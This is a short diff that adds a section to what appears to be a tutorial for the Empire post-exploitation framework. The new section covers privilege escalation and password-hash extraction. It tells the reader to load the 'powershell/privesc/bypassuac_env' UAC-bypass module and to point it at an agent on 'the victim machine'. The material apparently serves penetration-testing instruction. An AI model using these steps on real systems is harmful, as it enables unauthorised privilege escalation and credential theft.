@@ -89,3 +89,14 @@ interact S2PRDACB
 ```
 info
 ```
+
+
+####Elevating Privileges and Extracting Password Hashes
+
+To do this, type the following command: 
+
+```
+usemodule powershell/privesc/bypassuac_env
+```
+Set Listener to http, since we are using a http listener, and Agent to the agent from the victim machine.
+
